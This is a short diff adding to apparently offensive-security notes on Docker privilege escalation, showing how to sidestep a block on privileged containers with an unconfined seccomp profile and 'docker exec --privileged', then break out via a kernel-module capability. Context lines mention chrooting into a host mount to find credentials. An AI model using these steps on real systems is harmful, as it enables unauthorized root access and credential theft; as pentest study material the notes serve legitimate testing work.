@@ -22,3 +22,20 @@
     * `cd /mnt`
     * `chroot ./ bash`
     * Then find credentials in root mounted&#x20;
+
+### Use Case (Blocked by privileged mode but run in seccomp)
+
+* You are user in victim machine and want to get root and blocked by docker firewall when you run `docker run -d --privileged ubuntu:latest`
+
+Then you can run&#x20;
+
+* `docker run -d --security-opt "seccomp=unconfined" modified-ubuntu`
+* With that way we can start a container with seccomp profile set to unconfined.
+*   `docker exec -it --privileged {container_id} bash`
+
+    * `Check it with capsh --print`
+
+    Then use [cap\_sys\_module](../container-breakouts/#cap\_sys\_module-capability) breakout technique to breakout the container.&#x20;
+
+
+
